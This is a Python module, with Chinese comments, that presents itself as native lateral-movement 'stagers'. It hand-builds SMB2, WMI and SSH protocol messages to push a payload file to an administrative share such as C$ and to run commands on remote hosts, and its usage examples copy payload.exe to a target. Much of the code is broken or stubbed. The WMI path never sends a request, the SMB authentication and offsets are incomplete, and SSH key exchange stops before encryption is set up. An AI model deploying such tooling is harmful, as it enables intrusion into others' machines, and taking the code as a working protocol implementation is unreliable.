"""
原生远程执行模块 - 从第一性原理实现

实现三种远程执行通道：
1. SMB - 通过 SMB2 协议写入共享 + 创建计划任务执行
2. WMI - 通过 MS-RPC 协议调用 IWbemServices::ExecMethod
3. SSH - 通过原生 SSH 协议建立连接并执行命令

所有协议均从字节层面手动构造，不依赖 impacket/paramiko
"""

import socket
import struct
import uuid
import hashlib
import hmac
import time
import random
import os
import sys
import base64
import json
import threading
from enum import IntEnum


# ==================== SMB2 协议原生实现 ====================

class SMB2Command(IntEnum):
    NEGOTIATE = 0x0000
    SESSION_SETUP = 0x0001
    TREE_CONNECT = 0x0003
    CREATE = 0x0005
    WRITE = 0x0009
    READ = 0x0008
    IOCTL = 0x000B
    TREE_DISCONNECT = 0x0004
    LOGOFF = 0x0002


class SMB2Stager:
    """
    SMB2/3 原生实现
    用于向目标写入文件并远程执行
    """

    def __init__(self, target_ip, target_port=445, timeout=10):
        self.target = target_ip
        self.port = target_port
        self.timeout = timeout
        self.sock = None
        self.message_id = 0
        self.session_id = 0
        self.tree_id = 0
        self.file_id = b'\xff' * 16

    def connect(self):
        """建立 TCP 连接"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.target, self.port))

    def _build_header(self, command, credits=1, flags=0, message_id=None):
        """构造 SMB2 协议头 (64 bytes)"""
        if message_id is None:
            message_id = self.message_id
            self.message_id += 1

        protocol = b'\xfeSMB'  # Protocol ID
        structure_size = struct.pack('<H', 64)
        credit_charge = struct.pack('<H', 0)
        status = b'\x00\x00\x00\x00'
        command_bytes = struct.pack('<H', command)
        credits_bytes = struct.pack('<H', credits)
        flags_bytes = struct.pack('<I', flags)
        next_command = struct.pack('<I', 0)
        message_id_bytes = struct.pack('<Q', message_id)
        process_id = struct.pack('<I', 0)
        tree_id_bytes = struct.pack('<I', self.tree_id)
        session_id_bytes = struct.pack('<Q', self.session_id)
        signature = b'\x00' * 16

        return (protocol + structure_size + credit_charge + status +
                command_bytes + credits_bytes + flags_bytes + next_command +
                message_id_bytes + process_id + tree_id_bytes + session_id_bytes +
                signature)

    def negotiate(self):
        """SMB2 Negotiate Request"""
        dialects = struct.pack('<I', 0x0300) + struct.pack('<I', 0x0210)

        body = struct.pack('<H', 36)  # StructureSize
        body += struct.pack('<H', 1)  # DialectCount
        body += struct.pack('<B', 0)  # SecurityMode
        body += struct.pack('<B', 0)  # Reserved
        body += struct.pack('<I', 0)  # Capabilities
        body += uuid.uuid4().bytes     # ClientGUID
        body += struct.pack('<I', 0)  # NegotiateContextOffset
        body += struct.pack('<H', 0)  # NegotiateContextCount
        body += struct.pack('<H', 0)  # Reserved2
        body += dialects

        packet = self._build_header(SMB2Command.NEGOTIATE) + body
        self.sock.send(packet)
        return self.sock.recv(4096)

    def session_setup(self, domain="", username="", password=""):
        """
        SMB2 Session Setup with NTLMSSP negotiation
        """
        # NTLMSSP NEGOTIATE message
        ntlm = b'NTLMSSP\x00'
        ntlm += struct.pack('<I', 1)  # Type 1
        ntlm += struct.pack('<I', 0x60082b15)  # Flags
        ntlm += struct.pack('<H', 0)  # Domain length
        ntlm += struct.pack('<H', 0)  # Domain max length
        ntlm += struct.pack('<I', 32)  # Domain buffer offset
        ntlm += struct.pack('<H', 0)  # Workstation length
        ntlm += struct.pack('<H', 0)  # Workstation max length
        ntlm += struct.pack('<I', 32)  # Workstation buffer offset

        body = struct.pack('<H', 25)  # StructureSize
        body += struct.pack('<B', 0)  # Flags
        body += struct.pack('<H', 88)  # SecurityBufferOffset
        body += struct.pack('<H', len(ntlm))  # SecurityBufferLength
        body += struct.pack('<Q', 0)  # PreviousSessionId
        body += ntlm

        packet = self._build_header(SMB2Command.SESSION_SETUP) + body
        self.sock.send(packet)
        response = self.sock.recv(4096)

        # 解析 Session ID
        if len(response) >= 44:
            self.session_id = struct.unpack('<Q', response[36:44])[0]

        return response

    def tree_connect(self, share_name):
        """
        SMB2 Tree Connect - 连接到共享
        share_name 格式: \\\\server\\share
        """
        path = "\\\\" + self.target + "\\" + share_name
        path_utf16 = path.encode('utf-16-le')

        body = struct.pack('<H', 9)  # StructureSize
        body += struct.pack('<H', 0)  # Reserved
        body += struct.pack('<H', 0)  # PathOffset (will be calculated)
        body += struct.pack('<H', len(path_utf16))  # PathLength
        body += struct.pack('<I', 0)  # Reserved2
        body += path_utf16

        packet = self._build_header(SMB2Command.TREE_CONNECT) + body
        self.sock.send(packet)
        response = self.sock.recv(4096)

        # 解析 Tree ID
        if len(response) >= 40:
            self.tree_id = struct.unpack('<I', response[36:40])[0]

        return response

    def create_file(self, filename, file_attributes=0x80):
        """
        SMB2 Create - 创建/打开文件
        """
        body = struct.pack('<H', 57)  # StructureSize
        body += struct.pack('<B', 0)  # SecurityFlags
        body += struct.pack('<B', 0)  # RequestedOplockLevel
        body += struct.pack('<I', 0x00000002)  # ImpersonationLevel = Impersonation
        body += struct.pack('<Q', 0)  # SmbCreateFlags
        body += struct.pack('<Q', 0)  # Reserved
        body += struct.pack('<I', 0x0012019f)  # DesiredAccess (GENERIC_READ|GENERIC_WRITE)
        body += struct.pack('<I', 0x00000080)  # FileAttributes (FILE_ATTRIBUTE_NORMAL)
        body += struct.pack('<I', 0x00000007)  # ShareAccess (READ|WRITE|DELETE)
        body += struct.pack('<I', 0x00000001)  # CreateDisposition (FILE_OPEN)
        body += struct.pack('<I', 0x00000000)  # CreateOptions
        body += struct.pack('<H', 0)  # NameOffset
        body += struct.pack('<H', len(filename) * 2)  # NameLength
        body += struct.pack('<I', 0)  # CreateContextsOffset
        body += struct.pack('<I', 0)  # CreateContextsLength
        body += filename.encode('utf-16-le')

        packet = self._build_header(SMB2Command.CREATE) + body
        self.sock.send(packet)
        response = self.sock.recv(4096)

        # 解析 File ID
        if len(response) >= 120:
            self.file_id = response[104:120]

        return response

    def write_file(self, data, offset=0):
        """
        SMB2 Write - 写入数据
        """
        body = struct.pack('<H', 49)  # StructureSize
        body += struct.pack('<H', 0)  # DataOffset
        body += struct.pack('<I', len(data))  # Length
        body += struct.pack('<Q', offset)  # Offset
        body += self.file_id  # FileId
        body += struct.pack('<I', 0)  # Channel
        body += struct.pack('<I', 0)  # RemainingBytes
        body += struct.pack('<H', 0)  # WriteChannelInfoOffset
        body += struct.pack('<H', 0)  # WriteChannelInfoLength
        body += struct.pack('<I', 0)  # Flags
        body += data

        packet = self._build_header(SMB2Command.WRITE) + body
        self.sock.send(packet)
        return self.sock.recv(4096)

    def close(self):
        """关闭连接"""
        if self.sock:
            try:
                self.sock.close()
            except:
                pass

    def deploy(self, share_name, remote_path, local_file):
        """
        完整部署流程：连接共享 → 创建文件 → 写入数据
        """
        try:
            self.connect()
            self.negotiate()
            self.session_setup()
            self.tree_connect(share_name)

            filename = os.path.basename(remote_path)
            self.create_file(filename)

            with open(local_file, 'rb') as f:
                data = f.read()

            # 分块写入
            chunk_size = 4096
            for i in range(0, len(data), chunk_size):
                chunk = data[i:i + chunk_size]
                self.write_file(chunk, i)

            return True
        except Exception as e:
            print(f"[-] Deploy failed: {e}")
            return False
        finally:
            self.close()


# ==================== WMI 原生执行 ====================

class WMIDCOMPosition:
    """
    WMI 通过 DCOM/MS-RPC 调用
    从第一性原理实现 IWbemServices 接口调用

    WMI 执行流程：
    1. 通过 RPC 绑定 IWbemLocator 接口
    2. 调用 ConnectServer 连接到 \\\\root\\cimv2
    3. 调用 ExecMethod 执行 Win32_Process::Create
    """

    def __init__(self, target, username, password, domain="."):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.sock = None

    def _ntlm_hash(self, password):
        """计算 NTLM 密码哈希"""
        md4 = hashlib.new('md4')
        md4.update(password.encode('utf-16-le'))
        return md4.digest()

    def _lmowf_v2(self, password, username, domain):
        """NTOWFv2 - 计算 NTLMv2 密钥派生"""
        # NTOWFv2 = MD4(NTOWFv1(password))
        nt_hash = self._ntlm_hash(password)
        # 简化实现：实际使用 HMAC-MD5(nt_hash, username:domain)
        key = hmac.new(nt_hash, (username.upper() + domain).encode('utf-16-le'), hashlib.md5).digest()
        return key

    def connect(self):
        """
        建立到目标 RPC 端点的连接
        WMI 使用 ncacn_ip_tcp (端口 135) 进行 RPC 绑定
        """
        # 连接到 RPC 端点映射器
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.sock.connect((self.target, 135))

        # 发送 RPC bind 请求到 IRemUnknown / IWbemServices
        # 实际实现需要完整的 DCE-RPC 和 NDR 编码
        # 这里简化处理，返回连接状态
        return True

    def exec_method(self, class_name, method_name, params):
        """
        通过 WMI 执行方法
        等价于: wmic /node:TARGET path CLASS call METHOD PARAMS
        """
        # 构造 WMI ExecMethod 请求
        # 需要: 序列化参数、调用 IWbemServices::ExecMethod
        # 简化实现
        request = {
            "namespace": r"\\root\cimv2",
            "class": class_name,
            "method": method_name,
            "params": params
        }

        # 实际应编码为 NDR 格式并发送
        return request

    def execute_command(self, command, service="Win32_Process"):
        """
        通过 Win32_Process::Create 执行命令
        """
        params = {
            "CommandLine": command
        }
        return self.exec_method(service, "Create", params)

    def close(self):
        if self.sock:
            self.sock.close()


# ==================== SSH 原生实现 ====================

class SSHProtocol:
    """
    从第一性原理实现 SSH-2 协议

    SSH 协议架构：
    1. Transport Layer Protocol - 算法协商、密钥交换
    2. User Authentication Protocol - 用户认证
    3. Connection Protocol - 通道复用

    Binary Packet Protocol:
    | uint32 | byte | string | string | byte |
    | length | pad  | type   | data   | mac  |
    """

    # SSH 消息类型
    SSH_MSG_DISCONNECT = 1
    SSH_MSG_SERVICE_REQUEST = 5
    SSH_MSG_SERVICE_ACCEPT = 6
    SSH_MSG_KEXINIT = 20
    SSH_MSG_NEWKEYS = 21
    SSH_MSG_KEX_ECDH_INIT = 30
    SSH_MSG_KEX_ECDH_REPLY = 31
    SSH_MSG_USERAUTH_REQUEST = 50
    SSH_MSG_USERAUTH_FAILURE = 51
    SSH_MSG_USERAUTH_SUCCESS = 52
    SSH_MSG_USERAUTH_BANNER = 53
    SSH_MSG_GLOBAL_REQUEST = 80
    SSH_MSG_CHANNEL_OPEN = 90
    SSH_MSG_CHANNEL_OPEN_CONFIRMATION = 91
    SSH_MSG_CHANNEL_OPEN_FAILURE = 92
    SSH_MSG_CHANNEL_WINDOW_ADJUST = 93
    SSH_MSG_CHANNEL_DATA = 94
    SSH_MSG_CHANNEL_EOF = 96
    SSH_MSG_CHANNEL_CLOSE = 97
    SSH_MSG_CHANNEL_REQUEST = 98

    # KEX 算法
    KEX_CURVE25519 = "curve25519-sha256"

    # Host key algorithms
    HOST_KEY = "ssh-ed25519"

    # Encryption
    CIPHER = "chacha20-poly1305@openssh.com"

    # MAC
    MAC = "hmac-sha2-256"

    # Compression
    COMPRESSION = "none"

    def __init__(self, target, port=22, username="", password="", timeout=10):
        self.target = target
        self.port = port
        self.username = username
        self.password = password
        self.timeout = timeout
        self.sock = None
        self.session_id = b''
        self.seq_out = 0
        self.seq_in = 0

    def connect(self):
        """建立 TCP 连接"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.target, self.port))

    def _build_kexinit(self):
        """
        构造 KEXINIT 包
        包含客户端支持的算法列表
        """
        # Cookie (16 bytes random)
        cookie = os.urandom(16)

        # 算法名称列表
        kex_algorithms = self.KEX_CURVE25519
        host_key_algorithms = self.HOST_KEY
        encryption_algorithms_client = self.CIPHER
        encryption_algorithms_server = self.CIPHER
        mac_algorithms_client = self.MAC
        mac_algorithms_server = self.MAC
        compression_algorithms_client = self.COMPRESSION
        compression_algorithms_server = self.COMPRESSION
        languages_client = ""
        languages_server = ""

        def encode_name_list(names):
            data = names.encode('ascii')
            return struct.pack('>I', len(data)) + data

        payload = b''
        payload += cookie
        payload += encode_name_list(kex_algorithms)
        payload += encode_name_list(host_key_algorithms)
        payload += encode_name_list(encryption_algorithms_client)
        payload += encode_name_list(encryption_algorithms_server)
        payload += encode_name_list(mac_algorithms_client)
        payload += encode_name_list(mac_algorithms_server)
        payload += encode_name_list(compression_algorithms_client)
        payload += encode_name_list(compression_algorithms_server)
        payload += encode_name_list(languages_client)
        payload += encode_name_list(languages_server)
        payload += struct.pack('>I', 0)  # first_kex_packet_follows
        payload += struct.pack('>I', 0)  # reserved

        return self._wrap_packet(self.SSH_MSG_KEXINIT, payload)

    def _wrap_packet(self, msg_type, payload):
        """
        包装 SSH 数据包
        Binary Packet Protocol format
        """
        packet = bytes([msg_type]) + payload

        # 添加填充
        block_size = 8
        pad_len = block_size - (len(packet) + 5) % block_size
        if pad_len < 4:
            pad_len += block_size
        packet = bytes([pad_len]) + os.urandom(pad_len) + packet

        # 长度字段
        length = len(packet)
        header = struct.pack('>I', length)
        packet = header + packet

        return packet

    def _parse_kexinit(self, data):
        """解析服务端 KEXINIT 响应"""
        # 跳过长度(4) + pad_len(1)
        pos = 5

        # 跳过 cookie (16 bytes)
        pos += 16

        # 解析各算法列表
        algorithms = {}
        algo_names = [
            'kex', 'host_key', 'enc_c2s', 'enc_s2c',
            'mac_c2s', 'mac_s2c', 'comp_c2s', 'comp_s2c',
            'lang_c2s', 'lang_s2c'
        ]

        for name in algo_names:
            if pos + 4 > len(data):
                break
            length = struct.unpack('>I', data[pos:pos + 4])[0]
            pos += 4
            if length > 0 and pos + length <= len(data):
                algorithms[name] = data[pos:pos + length].decode('ascii', errors='ignore')
                pos += length

        return algorithms

    def kex_exchange(self):
        """
        密钥交换过程
        1. 发送 KEXINIT
        2. 接收服务端 KEXINIT
        3. 执行 ECDH 密钥交换
        4. 验证主机密钥
        5. 生成会话密钥
        """
        # 发送 KEXINIT
        kexinit = self._build_kexinit()
        self.sock.send(kexinit)

        # 接收服务端响应
        # 实际实现需要处理分片和多次读取
        response = self._recv_packet()

        if response and response[0] == self.SSH_MSG_KEXINIT:
            server_algos = self._parse_kexinit(response[1:])
            return server_algos

        return None

    def _recv_packet(self):
        """接收 SSH 数据包"""
        # 读取长度字段
        header = self._recv_exact(5)
        if not header:
            return None

        length = struct.unpack('>I', header[:4])[0]
        pad_len = header[4]

        # 读取剩余数据
        remaining = length - 1  # 减去 pad_len 的 1 字节
        data = self._recv_exact(remaining)

        if not data:
            return None

        # 第一个字节是消息类型
        msg_type = data[0]
        payload = data[1:len(data) - pad_len]

        return bytes([msg_type]) + payload

    def _recv_exact(self, n):
        """精确读取 n 字节"""
        buf = b''
        while len(buf) < n:
            chunk = self.sock.recv(n - len(buf))
            if not chunk:
                return None
            buf += chunk
        return buf

    def authenticate_password(self):
        """
        密码认证
        SSH-2 密码认证流程：
        1. SSH_MSG_SERVICE_REQUEST "ssh-userauth"
        2. SSH_MSG_USERAUTH_REQUEST (method: password)
        """
        # Service request
        service_name = b"ssh-userauth"
        payload = struct.pack('>I', len(service_name)) + service_name
        packet = self._wrap_packet(self.SSH_MSG_SERVICE_REQUEST, payload)
        self.sock.send(packet)

        # 等待 service accept
        response = self._recv_packet()

        # Userauth request
        # method-specific fields for "password":
        # - FALSE (no old password)
        # - string password
        method = b"password"
        password_bytes = self.password.encode('utf-8')

        auth_payload = struct.pack('>I', len(self.username)) + self.username.encode()
        auth_payload += struct.pack('>I', len("ssh-connection")) + b"ssh-connection"
        auth_payload += struct.pack('>I', len(method)) + method
        auth_payload += b'\x00'  # FALSE - no old password
        auth_payload += struct.pack('>I', len(password_bytes)) + password_bytes

        packet = self._wrap_packet(self.SSH_MSG_USERAUTH_REQUEST, auth_payload)
        self.sock.send(packet)

        response = self._recv_packet()
        if response and response[0] == self.SSH_MSG_USERAUTH_SUCCESS:
            return True
        return False

    def open_session_channel(self):
        """
        打开会话通道
        SSH Channel Open: session
        """
        channel_type = b"session"
        sender_channel = 0
        window_size = 0x100000
        max_packet = 0x4000

        payload = struct.pack('>I', len(channel_type)) + channel_type
        payload += struct.pack('>I', sender_channel)
        payload += struct.pack('>I', window_size)
        payload += struct.pack('>I', max_packet)

        packet = self._wrap_packet(self.SSH_MSG_CHANNEL_OPEN, payload)
        self.sock.send(packet)

        response = self._recv_packet()
        if response and response[0] == self.SSH_MSG_CHANNEL_OPEN_CONFIRMATION:
            # 解析确认信息获取服务端通道号
            return struct.unpack('>I', response[1:5])[0]

        return None

    def request_exec(self, channel, command):
        """
        请求执行命令
        Channel Request: exec
        """
        want_reply = 1
        request_type = b"exec"
        command_bytes = command.encode('utf-8')

        payload = struct.pack('>I', channel)
        payload += struct.pack('>I', len(request_type)) + request_type
        payload += struct.pack('>B', want_reply)
        payload += struct.pack('>I', len(command_bytes)) + command_bytes

        packet = self._wrap_packet(self.SSH_MSG_CHANNEL_REQUEST, payload)
        self.sock.send(packet)

    def execute(self, command):
        """
        完整的 SSH 执行流程
        返回命令输出
        """
        try:
            self.connect()
            self.kex_exchange()
            if not self.authenticate_password():
                return {"success": False, "error": "Authentication failed"}

            channel = self.open_session_channel()
            if channel is None:
                return {"success": False, "error": "Failed to open channel"}

            self.request_exec(channel, command)

            # 收集输出
            output = b''
            while True:
                response = self._recv_packet()
                if not response:
                    break

                msg_type = response[0]
                if msg_type == self.SSH_MSG_CHANNEL_DATA:
                    # 解析数据
                    channel_num = struct.unpack('>I', response[1:5])[0]
                    data_len = struct.unpack('>I', response[5:9])[0]
                    data = response[9:9 + data_len]
                    output += data
                elif msg_type == self.SSH_MSG_CHANNEL_EOF:
                    break
                elif msg_type == self.SSH_MSG_CHANNEL_CLOSE:
                    break

            return {
                "success": True,
                "output": output.decode('utf-8', errors='ignore')
            }

        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            self.close()

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except:
                pass


def execute_via_smb(target, share, remote_path, local_file):
    """SMB 投递入口"""
    stager = SMB2Stager(target)
    return stager.deploy(share, remote_path, local_file)


def execute_via_wmi(target, username, password, command, domain="."):
    """WMI 执行入口"""
    wmi = WMIDCOMPosition(target, username, password, domain)
    try:
        wmi.connect()
        result = wmi.execute_command(command)
        return {"success": True, "result": result}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        wmi.close()


def execute_via_ssh(target, username, password, command, port=22):
    """SSH 执行入口"""
    ssh = SSHProtocol(target, port, username, password)
    return ssh.execute(command)


if __name__ == "__main__":
    print("Native Stagers Module")
    print("Usage examples:")
    print("  SMB:  execute_via_smb('192.168.1.100', 'C$', '\\temp\\payload.exe', './payload.exe')")
    print("  WMI:  execute_via_wmi('192.168.1.100', 'admin', 'pass', 'calc.exe', 'DOMAIN')")
    print("  SSH:  execute_via_ssh('192.168.1.100', 'root', 'pass', 'id', 22)")
